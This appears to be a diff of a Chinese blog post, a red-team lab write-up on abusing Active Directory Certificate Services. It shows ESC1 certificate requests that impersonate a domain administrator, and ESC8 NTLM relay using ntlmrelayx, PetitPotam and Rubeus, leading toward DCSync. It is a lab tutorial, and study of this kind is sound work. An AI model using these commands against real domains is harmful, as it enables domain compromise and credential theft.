@@ -98,33 +98,22 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>About</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>Contact</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/friends" class="waves-effect waves-light">
       
       <i class="fas fa-address-book" style="zoom: 0.6;"></i>
       
       <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
     </a>
     
   </li>
@@ -201,33 +190,22 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			About
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			Contact
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/friends" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-address-book"></i>
 			
 			Friends
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
 		</a>
           
         </li>
@@ -308,10 +286,23 @@
 </header>
 
     
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png')">
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,12 +423,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Domain-environment/">
-                                <span class="chip bg-color">Domain environment</span>
-                            </a>
-                        
                             <a href="/tags/Redteam/">
                                 <span class="chip bg-color">Redteam</span>
+                            </a>
+                        
+                            <a href="/tags/Domain-Environment/">
+                                <span class="chip bg-color">Domain Environment</span>
+                            </a>
+                        
+                            <a href="/tags/PTT/">
+                                <span class="chip bg-color">PTT</span>
                             </a>
                         
                             <a href="/tags/DPE/">
@@ -454,10 +449,6 @@
                         
                             <a href="/tags/ESC8/">
                                 <span class="chip bg-color">ESC8</span>
-                            </a>
-                        
-                            <a href="/tags/PTT/">
-                                <span class="chip bg-color">PTT</span>
                             </a>
                         
                     </div>
@@ -488,7 +479,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-08-21
+                    2021-09-10
                 </div>
                 
 
@@ -530,10 +521,9 @@
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">利用方式Certified Pre-Owned: Abusing Active Directory Certificate Services出自于black hat2021
 https:&#x2F;&#x2F;www.blackhat.com&#x2F;us-21&#x2F;briefings&#x2F;schedule&#x2F;#certified-pre-owned-abusing-active-directory-certificate-services-23168
 
-ad cs白皮书：
 https:&#x2F;&#x2F;www.specterops.io&#x2F;assets&#x2F;resources&#x2F;Certified_Pre-Owned.pdf
 
-强烈建议看下文前先过一遍议题&amp;白皮书，可以避免很多坑点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+强烈建议看下文前先过下上面两个英文素材，可以避免很多坑点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><h3 id="PKI（Public-Key-Infrastructure公钥基础设施）"><a href="#PKI（Public-Key-Infrastructure公钥基础设施）" class="headerlink" title="PKI（Public Key Infrastructure公钥基础设施）"></a>PKI（Public Key Infrastructure公钥基础设施）</h3><pre class="line-numbers language-none"><code class="language-none">软件、加密技术、流程和服务的组合，使得组织能够保护其数据、通信、业务交易，PKI依赖于经过身份验证的用户和受信任资源之间的数字证书交换，可以用证书来保护数据并管理来自组织内外的用户和计算机身份凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -555,54 +545,54 @@ ADCS提供所有与PKI相关的组件作为角色服务，每个角色负责证�
 
 <h4 id="证书注册策略web服务"><a href="#证书注册策略web服务" class="headerlink" title="证书注册策略web服务"></a>证书注册策略web服务</h4><pre class="line-numbers language-none"><code class="language-none">使得用户能够获取证书注册策略信息，结合CES，可以在用户设备未加入域或无法连接域控的情况下基于策略的证书注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="图片介绍"><a href="#图片介绍" class="headerlink" title="图片介绍"></a>图片介绍</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172411337.png"></p>
+<h4 id="图片介绍"><a href="#图片介绍" class="headerlink" title="图片介绍"></a>图片介绍</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172411337.png"></p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><pre class="line-numbers language-none"><code class="language-none">功能安装处如下选择：
 
 证书颁发机构
 证书颁发机构web注册
 证书注册web服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103047564.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103130284.png"></p>
-<h3 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103341653.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172508459.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103047564.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103130284.png"></p>
+<h3 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103341653.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172508459.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">如下选择进行服务的细节配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103412505.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103433153.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103458913.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103527977.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103548543.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103609920.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103620572.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103638717.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103651916.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103412505.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103433153.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103458913.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103527977.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103548543.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103609920.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103620572.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103638717.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103651916.png"></p>
 <h3 id="配置证书注册web服务"><a href="#配置证书注册web服务" class="headerlink" title="配置证书注册web服务"></a>配置证书注册web服务</h3><pre class="line-numbers language-none"><code class="language-none">上一步完成会告诉你是否要配置其他角色服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103751908.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103751908.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">依次如下配置即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103905088.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103919750.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103942267.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103951717.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813104034198.png"></p>
-<h3 id="搭建完效果如下"><a href="#搭建完效果如下" class="headerlink" title="搭建完效果如下"></a>搭建完效果如下</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813105753003.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103905088.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103919750.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103942267.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103951717.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813104034198.png"></p>
+<h3 id="搭建完效果如下"><a href="#搭建完效果如下" class="headerlink" title="搭建完效果如下"></a>搭建完效果如下</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813105753003.png"></p>
 <h3 id="辅助域控搭建"><a href="#辅助域控搭建" class="headerlink" title="辅助域控搭建"></a>辅助域控搭建</h3><pre class="line-numbers language-none"><code class="language-none">这里是把adcs搭成了辅助域控<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155635888.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155651462.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155635888.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155651462.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">配置如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">主从复制<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">一步步直接操作即可，按照提示完成相关的操作即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172343449.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172343449.png"></p>
 <h2 id="证书颁发机构信息获取"><a href="#证书颁发机构信息获取" class="headerlink" title="证书颁发机构信息获取"></a>证书颁发机构信息获取</h2><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">域内成员可成功定位到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172332440.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172322940.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172332440.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172322940.png"></p>
 <h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">获得ca名称
 <span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active
 更多细节信息
 <span class="token variable">$CAName</span> = <span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active<span class="token punctuation">;</span>
 <span class="token function">Get-Itemproperty</span> <span class="token operator">-</span>Path “HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<span class="token variable">$CAName</span>”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172313339.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172313339.png"></p>
 <h3 id="测试联通性"><a href="#测试联通性" class="headerlink" title="测试联通性"></a>测试联通性</h3><pre class="line-numbers language-none"><code class="language-none">确认NTLM协议（后面中继要用）
 curl http:&#x2F;&#x2F;192.168.3.73&#x2F;certsrv -I<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172301814.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172301814.png"></p>
 <h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><pre class="line-numbers language-none"><code class="language-none">个人原因，ESC1在部署的另外一套环境测试，也是同样的上方部署方式即可
 
 这里其实是有些坑点的，此处万分感谢李木师傅的解答~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -610,13 +600,13 @@ curl http:&#x2F;&#x2F;192.168.3.73&#x2F;certsrv -I<span aria-hidden="true" class
 <h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">攻击者可以在证书服务请求中指定主体名称，则请求者可以请求任何人（域管）的证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">进入证书模板配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172252110.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172252110.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">如下进行配置（存在客户端身份验证就行）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172242388.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172242388.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">允许注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172230565.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172230565.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">如下配置在请求中提供<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172222795.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172222795.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">建议拷贝个模板出来做实验!!!
 
 如此将允许低权限用户使用任意SAN请求证书，从而允许低权限用户通过kerberos或schannel作为域中任何主体进行身份验证
@@ -649,24 +639,24 @@ DACL                    : NT AUTHORITY\Authenticated Users (Allow) - Read, Enrol
                           YANGSIR\Domain Users (Allow) - Enroll
                           YANGSIR\Enterprise Admins (Allow) - Read, Write, Enroll
 Misconfigurations       : ESC1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172202595.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172202595.png"></p>
 <pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">通过普通域用户申请证书，注意UPN需要为域管<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172150232.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172140403.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172150232.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172140403.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">确认申请成功如下，为administrator权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172131605.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172131605.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">确认使用者信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172123019.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172123019.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">导出证书
 certutil -user -exportPFX sha1 yangsirdomainuser.pfx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172115476.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172115476.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">此处通过凭证进行PTT出现失败，后推测可能是时间同步的问题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172050369.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172050369.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">对机器重启后，再次PTT即可成功，使用先前导出的凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172024825.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172024825.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">确认凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815171956871.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815171956871.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">确认可成功获取权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815171943256.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815171943256.png"></p>
 <h2 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h2><h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">网上很多了，PetitPotam进行NTLM中继到域管
 
 在ADCS下通过管理员可选择安装的附加服务器角色支持多种基于HTTP的注册方法，如证书注册服务通过安装证书注册web服务，通过安装证书注册策略web服务角色&amp;证书注册策略web协同工作，然而此类http证书的注册接口都非常容易遭受NTLM中继
@@ -676,25 +666,25 @@ certutil -user -exportPFX sha1 yangsirdomainuser.pfx<span aria-hidden="true" cla
 默认情况下，证书注册服务、证书注册策略web服务、网络设备注册服务通过授权http头支持协商身份验证，支持kerberos及NTLM。所以攻击者可以在中继攻击时获得NTLM身份验证虚拟性
 默认情况下，不会启用https，但是https本身不能抵抗NTLM中继！！！只有当https&amp;通道绑定相结合的时候，才能保护HTTPS服务免遭NTLM中继，ADCS没有为IIS上的身份验证启用扩展保护，并不能启用通道绑定！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816194325538.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816194325538.png"></p>
 <h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里要用的是impacket下的ntlmrelayx
 开启监听
 python3 ntlmrelayx.py -t http://192.168.3.73/certsrv/certfnsh.asp -smb2support --adcs --template <span class="token string">'DomainController'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816195928550.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816195928550.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">PetitPotam强制用户进行身份验证
 
 PetitPotam.exe  192.168.3.11  192.168.3.144 [监听ip、目标服务ip]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200115491.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200115491.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">获得凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">rubeus进行ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200335385.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200335385.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">凭证已经获取，可以直接冲dcsync
 
